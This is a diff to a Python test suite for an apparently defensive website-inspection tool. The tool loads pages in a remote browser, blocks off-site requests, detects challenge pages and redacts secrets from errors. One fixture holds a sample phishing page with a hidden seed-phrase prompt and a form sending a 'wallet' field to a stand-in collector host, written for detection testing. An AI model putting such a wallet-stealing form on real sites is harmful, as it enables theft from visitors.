@@ -2,10 +2,14 @@ import asyncio
 import io
 import json
 from pathlib import Path
+import shutil
+import subprocess
 import sys
 import unittest
 from unittest.mock import AsyncMock, Mock, patch
 from urllib.error import HTTPError
+
+from playwright.async_api import Error as BrowserError, TimeoutError as BrowserTimeout
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
 
@@ -13,7 +17,7 @@ from trustline.inspection import JevError
 from trustline.reviews import ReviewManager, review_url
 from trustline.remote import (
     HTML_LIMIT, CloudflareBrowser, RemoteError, RemoteReviewer, compact_html, page_features,
-    page_state, public_url,
+    browser_error_code, page_state, public_url,
 )
 
 
@@ -199,7 +203,8 @@ class RemoteReviewerTests(unittest.IsolatedAsyncioTestCase):
 
     def test_page_html_is_compacted_for_jev_but_keeps_what_visitors_cannot_see(self):
         html = compact_html(
-            "<html><head><style>body { color: red }</style><!-- note --></head>\n<body>\n"
+            "<html><head><meta name='robots' content='head-only'><script src='/preload.js'></script></head>"
+            "\n<body>\n<style>body { color: red }</style><!-- note -->"
             "<svg viewBox='0 0 9 9'><path d='M0 0L9 9'/></svg><img src='data:image/png;base64,QUJDRA=='>"
             "<div hidden>Enter your seed phrase</div>"
             "<form action='https://collector.example/steal'><input type='hidden' name='wallet'></form>"
@@ -208,7 +213,7 @@ class RemoteReviewerTests(unittest.IsolatedAsyncioTestCase):
         for kept in ["Enter your seed phrase", "https://collector.example/steal", "name='wallet'",
                      "eth_requestAccounts", "<style></style>", "<svg viewBox='0 0 9 9'></svg>", "data:…"]:
             self.assertIn(kept, html)
-        for dropped in ["color: red", "note", "M0 0L9 9", "QUJDRA==", "x" * 2001, "\n"]:
+        for dropped in ["color: red", "note", "M0 0L9 9", "QUJDRA==", "x" * 2001, "\n", "head-only", "preload.js"]:
             self.assertNotIn(dropped, html)
         self.assertEqual(len(compact_html("<p>" + "a " * 100000 + "</p>")), HTML_LIMIT)
         self.assertEqual(compact_html(None), "")
@@ -244,10 +249,64 @@ class RemoteReviewerTests(unittest.IsolatedAsyncioTestCase):
             await browser.route(route)
             route.abort.assert_awaited_once()
             route.continue_.assert_not_awaited()
+        # The page's own loads count against approval; the file:// subresource does not.
+        self.assertEqual(len(browser.blocked), 2)
+        self.assertEqual(browser.background_blocks, 1)
         for action in [{"action": "type", "text": "secret"}, {"action": "navigate", "url": "https://different.example/"},
                        {"action": "click_link", "x": -1, "y": 2}]:
             with self.assertRaises((ValueError, RemoteError)):
                 await browser.act(action)
+
+    async def test_background_blocks_are_counted_but_only_main_page_blocks_void_approval(self):
+        browser = CloudflareBrowser("a" * 32, "synthetic-token")
+        browser.initial_origin = "https://ordinary.example"
+        browser.check_public_host = AsyncMock(return_value=True)
+        main_frame, ad_frame = object(), object()
+        browser.page = Mock(main_frame=main_frame)
+        for url, method, kind, navigation, frame in [
+                ("https://ordinary.example/collect", "POST", "xhr", False, main_frame),      # analytics beacon
+                ("https://ordinary.example/live", "GET", "eventsource", False, main_frame),  # event stream
+                ("https://ads.example/frame", "GET", "document", True, ad_frame)]:            # cross-origin iframe
+            request = Mock(url=url, method=method, resource_type=kind, frame=frame,
+                           is_navigation_request=Mock(return_value=navigation))
+            await browser.route(Mock(request=request, continue_=AsyncMock(), abort=AsyncMock()))
+        self.assertEqual((browser.blocked, browser.background_blocks), ([], 3))
+        request = Mock(url="https://evil.example/", method="GET", resource_type="document", frame=main_frame,
+                       is_navigation_request=Mock(return_value=True))
+        await browser.route(Mock(request=request, continue_=AsyncMock(), abort=AsyncMock()))
+        self.assertEqual(browser.blocked, ["The page itself was blocked by the inspection policy"])
+
+    async def test_an_http_to_https_upgrade_on_the_same_host_is_the_same_site(self):
+        browser = CloudflareBrowser("a" * 32, "synthetic-token")
+        browser.initial_origin = "http://edgetrust.example"
+        browser.check_public_host = AsyncMock(return_value=True)
+        self.assertTrue(browser.same_site("https://edgetrust.example"))
+        self.assertTrue(browser.same_site("http://edgetrust.example"))
+        self.assertFalse(browser.same_site("https://other.example"))
+        self.assertFalse(browser.same_site("https://edgetrust.example.evil.example"))
+        request = Mock(url="https://edgetrust.example/", method="GET", resource_type="document",
+                       is_navigation_request=Mock(return_value=True))
+        route = Mock(request=request, continue_=AsyncMock(), abort=AsyncMock())
+        await browser.route(route)
+        route.continue_.assert_awaited_once()
+        browser.initial_origin = "http://edgetrust.example:8080"
+        self.assertIsNone(browser.https_upgrade())
+        browser.initial_origin = "https://edgetrust.example"
+        self.assertIsNone(browser.https_upgrade())
+        self.assertFalse(browser.same_site("http://edgetrust.example"))
+
+    async def test_oversized_or_missing_scrolls_are_clamped_instead_of_failing_the_review(self):
+        browser = CloudflareBrowser("a" * 32, "synthetic-token")
+        browser.page = Mock(mouse=Mock(wheel=AsyncMock()))
+        for y, expected in [(5000, 1600), (-3000, -1600), (600, 600), (None, 800), (412.6, 413)]:
+            with patch("trustline.remote.asyncio.sleep", AsyncMock()):
+                await browser.act({"action": "scroll", "y": y})
+            self.assertEqual(browser.page.mouse.wheel.await_args.args, (0, expected))
+
+    async def test_an_allow_stands_when_only_background_requests_were_blocked(self):
+        browser = self.browser(url="https://shop.example/", background_requests_blocked=12)
+        result = await RemoteReviewer(self.allowing_model(), lambda: browser).review("https://shop.example/")
+        self.assertEqual(result["verdict"], "allow")
 
     async def test_cloudflare_uses_guarded_remote_cdp_and_deletes_session_without_local_launch(self):
         page = Mock(on=Mock(), goto=AsyncMock(return_value=Mock(status=200, headers={})))
@@ -277,6 +336,206 @@ class RemoteReviewerTests(unittest.IsolatedAsyncioTestCase):
         self.assertEqual(service.call_args_list[-1].kwargs["method"], "DELETE")
         connected.close.assert_awaited_once()
         runtime.stop.assert_awaited_once()
+
+    def test_only_main_document_responses_update_status_and_challenge_state(self):
+        browser = CloudflareBrowser("a" * 32, "synthetic-token")
+        browser.page = Mock(main_frame=object())
+        def response(status, mitigation=None, *, frame=None, navigation=True):
+            return Mock(status=status, headers={"cf-mitigated": mitigation} if mitigation else {},
+                        request=Mock(is_navigation_request=Mock(return_value=navigation),
+                                     frame=frame or browser.page.main_frame))
+        browser.document_response(response(403, "challenge"))
+        self.assertEqual((browser.http_status, browser.mitigation), (403, "challenge"))
+        browser.document_response(response(200, navigation=False))
+        browser.document_response(response(200, frame=object()))
+        self.assertEqual((browser.http_status, browser.mitigation), (403, "challenge"))
+        browser.document_response(response(200))
+        self.assertEqual((browser.http_status, browser.mitigation), (200, None))
+        browser.document_response(response(403, "guardrails"))
+        self.assertEqual(len(browser.blocked), 1)
+
+    async def test_challenge_clears_before_either_model_reads_the_actual_page(self):
+        browser = CloudflareBrowser("a" * 32, "synthetic-token")
+        browser.initial_origin = "https://ordinary.example"
+        browser.http_status = 403
+        browser.start = AsyncMock()
+        browser.close = AsyncMock()
+        browser.challenge_present = AsyncMock(side_effect=[True, False])
+        browser.page = Mock(url="https://ordinary.example/", main_frame=object(),
+            is_closed=Mock(return_value=False), screenshot=AsyncMock(return_value=b"jpeg"),
+            evaluate=AsyncMock(return_value={"text": "Actual shop page", "html": "<body>Actual shop page</body>"}))
+        model, jev = self.allowing_model(), Mock(assess_page=Mock(return_value=(0.1, 0.8)))
+        async def cleared(_):
+            model.action.assert_not_called()
+            jev.assess_page.assert_not_called()
+            browser.document_response(Mock(status=200, headers={}, request=Mock(
+                is_navigation_request=Mock(return_value=True), frame=browser.page.main_frame)))
+        with patch("trustline.remote.asyncio.sleep", side_effect=cleared) as wait:
+            result = await RemoteReviewer(model, lambda: browser, jev=jev).review("https://ordinary.example/")
+        self.assertEqual(result["verdict"], "allow")
+        self.assertEqual(model.action.call_args.args[0]["http_status"], 200)
+        self.assertEqual(model.action.call_args.args[0]["text"], "Actual shop page")
+        self.assertEqual(jev.assess_page.call_args.args[0]["text"], "Actual shop page")
+        wait.assert_awaited_once_with(0.5)
+        browser.close.assert_awaited_once()
+
+    async def test_persistent_challenge_stays_inconclusive_without_model_calls_or_probability(self):
+        browser = CloudflareBrowser("a" * 32, "synthetic-token")
+        browser.start = AsyncMock()
+        browser.close = AsyncMock()
+        browser.http_status, browser.mitigation = 403, "challenge"
+        browser.page = Mock(is_closed=Mock(return_value=False), screenshot=AsyncMock(), evaluate=AsyncMock())
+        model, jev = self.allowing_model(), Mock(assess_page=Mock())
+        manager = ReviewManager(RemoteReviewer(model, lambda: browser, jev=jev))
+        self.addCleanup(manager.close)
+        with patch("trustline.remote.CHALLENGE_WAIT_SECONDS", 0.02):
+            row = manager.start("https://ordinary.example/")
+            await row.task
+        self.assertEqual(row.status, "inconclusive")
+        self.assertIn("browser check did not clear", row.reason)
+        self.assertIsNone(row.page_probability)
+        self.assertFalse(manager.allowed(row.url, "main_frame", "GET"))
+        model.action.assert_not_called()
+        jev.assess_page.assert_not_called()
+        browser.page.screenshot.assert_not_awaited()
+        browser.page.evaluate.assert_not_awaited()
+        browser.close.assert_awaited_once()
+
+    async def test_ordinary_page_does_not_wait_and_challenge_context_reload_is_rechecked(self):
+        browser = CloudflareBrowser("a" * 32, "synthetic-token")
+        browser.page = Mock(evaluate=AsyncMock(return_value=False))
+        with patch("trustline.remote.asyncio.sleep", new_callable=AsyncMock) as wait:
+            await browser.wait_for_site()
+        wait.assert_not_awaited()
+        browser.page.evaluate = AsyncMock(side_effect=[
+            BrowserError("Execution context was destroyed, most likely because of a navigation"), False])
+        with patch("trustline.remote.asyncio.sleep", new_callable=AsyncMock) as wait:
+            await browser.wait_for_site()
+        wait.assert_awaited_once_with(0.5)
+
+    @unittest.skipUnless(shutil.which("node"), "Node.js executes the fixed challenge detector")
+    async def test_fixed_challenge_detector_executes_and_ignores_embedded_widgets(self):
+        browser = CloudflareBrowser("a" * 32, "synthetic-token")
+        browser.page = Mock(evaluate=AsyncMock(return_value=False))
+        await browser.challenge_present()
+        script = browser.page.evaluate.await_args.args[0]
+        cases = [
+            {"title": "Shop", "text": "Welcome", "status": 200},
+            {"title": "Just a moment...", "text": "Checking your browser", "status": 200},
+            {"title": "Access denied", "text": "Checking your browser before accessing the site", "status": 403},
+            {"title": "Sign in", "text": "Sign in. Verify you are human", "status": 200},
+            {"title": "Shop", "text": "Product " * 400 + "Verify you are human", "status": 200},
+            {"title": "", "text": "Please wait", "marker": True, "status": 200},
+        ]
+        # Execute the actual fixed JS sent to Playwright, so mocks cannot hide a
+        # syntax error or a detector that flags an ordinary embedded widget.
+        runner = """
+            const {script, cases} = JSON.parse(require('node:fs').readFileSync(0, 'utf8'));
+            const detect = eval('(' + script + ')');
+            const results = cases.map(item => {
+                globalThis.document = {title: item.title, body: {innerText: item.text},
+                    querySelector: () => item.marker ? {} : null};
+                return detect({status: item.status});
+            });
+            process.stdout.write(JSON.stringify(results));
+        """
+        result = subprocess.run([shutil.which("node"), "-e", runner],
+                                input=json.dumps({"script": script, "cases": cases}),
+                                capture_output=True, text=True, timeout=5)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertEqual(json.loads(result.stdout), [False, True, True, False, False, True])
+
+    async def test_challenge_wait_never_retries_a_navigation_blocked_by_policy(self):
+        browser = CloudflareBrowser("a" * 32, "synthetic-token")
+        browser.mitigation = "challenge"
+        browser.blocked = ["A required navigation was blocked"]
+        with patch("trustline.remote.asyncio.sleep", new_callable=AsyncMock) as wait:
+            with self.assertRaisesRegex(RemoteError, "inspection policy"):
+                await browser.wait_for_site()
+        wait.assert_not_awaited()
+
+    async def test_transient_navigation_failure_retries_in_the_same_guarded_page(self):
+        for code in ("ERR_CONNECTION_RESET", "ERR_CONNECTION_CLOSED", "ERR_NETWORK_CHANGED",
+                     "ERR_HTTP2_PROTOCOL_ERROR"):
+            with self.subTest(code=code):
+                browser = CloudflareBrowser("a" * 32, "synthetic-token")
+                response = Mock(status=200, headers={})
+                browser.page = Mock(goto=AsyncMock(side_effect=[BrowserError(f"net::{code}"), response]))
+                browser.stage = "loading the site"
+                with patch("trustline.remote.asyncio.sleep", new_callable=AsyncMock) as wait:
+                    self.assertIs(await browser.navigate("https://ordinary.example/"), response)
+                self.assertEqual(browser.page.goto.await_count, 2)
+                self.assertEqual(browser.page.goto.await_args_list[0], browser.page.goto.await_args_list[1])
+                wait.assert_awaited_once_with(0.5)
+                self.assertIsNone(browser.session_id)
+
+    async def test_navigation_does_not_retry_persistent_errors_or_policy_blocks(self):
+        for error, blocked in [
+            (BrowserError("net::ERR_NAME_NOT_RESOLVED"), []),
+            (BrowserError("net::ERR_CERT_DATE_INVALID"), []),
+            (BrowserError("net::ERR_CONNECTION_REFUSED"), []),
+            (BrowserError("net::ERR_FAILED"), []),
+            (BrowserTimeout("Timeout exceeded"), []),
+            (BrowserError("net::ERR_CONNECTION_RESET"), ["Navigation denied"]),
+        ]:
+            browser = CloudflareBrowser("a" * 32, "synthetic-token")
+            browser.page = Mock(goto=AsyncMock(side_effect=error))
+            browser.blocked = blocked
+            with patch("trustline.remote.asyncio.sleep", new_callable=AsyncMock) as wait:
+                with self.assertRaises(type(error)):
+                    await browser.navigate("https://ordinary.example/")
+            browser.page.goto.assert_awaited_once()
+            wait.assert_not_awaited()
+
+    async def test_repeated_reset_stays_blocked_and_explains_failure_without_private_error_text(self):
+        error = BrowserError("Page.goto: net::ERR_CONNECTION_RESET at https://ordinary.example/?token=secret-token")
+        browser = CloudflareBrowser("a" * 32, "synthetic-token")
+        browser.page = Mock(goto=AsyncMock(side_effect=error))
+        browser.stage = "loading the site"
+        browser.start = browser.navigate
+        browser.close = AsyncMock()
+        browser.observe = AsyncMock()
+        model, jev = self.allowing_model(), Mock(assess_page=Mock())
+        manager = ReviewManager(RemoteReviewer(model, lambda: browser, jev=jev))
+        self.addCleanup(manager.close)
+        with patch("trustline.remote.asyncio.sleep", new_callable=AsyncMock), \
+                patch("trustline.remote.debug.log") as log:
+            row = manager.start("https://ordinary.example/")
+            await row.task
+        self.assertEqual(browser.page.goto.await_count, 2)
+        self.assertEqual(row.status, "inconclusive")
+        self.assertIn("connection to the website was reset", row.reason)
+        self.assertIn("remains blocked", row.reason)
+        self.assertFalse(manager.allowed(row.url, "main_frame", "GET"))
+        self.assertNotIn("secret-token", str(manager.snapshot(row.token)))
+        self.assertNotIn("secret-token", str(log.call_args_list))
+        event = next(call for call in log.call_args_list if call.args == ("cloud.error",))
+        self.assertEqual(event.kwargs["code"], "ERR_CONNECTION_RESET")
+        browser.observe.assert_not_awaited()
+        model.action.assert_not_called()
+        jev.assess_page.assert_not_called()
+        browser.close.assert_awaited_once()
+
+    async def test_browser_setup_errors_get_fixed_explanations(self):
+        for stage, explanation in [
+            ("connecting to the Cloudflare browser", "could not connect"),
+            ("configuring the Cloudflare browser", "could not prepare"),
+            ("reading the page", "could not read"),
+        ]:
+            browser = self.browser()
+            browser.stage = stage
+            browser.start.side_effect = BrowserError("Authorization: secret-token wss://private.example/")
+            with self.assertRaises(RemoteError) as caught:
+                await RemoteReviewer(self.allowing_model(), lambda: browser).review("https://ordinary.example/")
+            self.assertIn(explanation, str(caught.exception))
+            self.assertNotIn("secret-token", str(caught.exception))
+            self.assertNotIn("private.example", str(caught.exception))
+            browser.close.assert_awaited_once()
+
+    def test_browser_error_code_keeps_only_the_network_code(self):
+        self.assertEqual(browser_error_code(BrowserError(
+            "net::ERR_CONNECTION_RESET at https://ordinary.example/?token=secret")), "ERR_CONNECTION_RESET")
+        self.assertIsNone(browser_error_code(BrowserError("wss://private.example/?token=secret")))
 
     async def test_cloudflare_rate_limit_waits_without_launching_and_retries_only_once(self):
         browser = CloudflareBrowser("a" * 32, "synthetic-token")
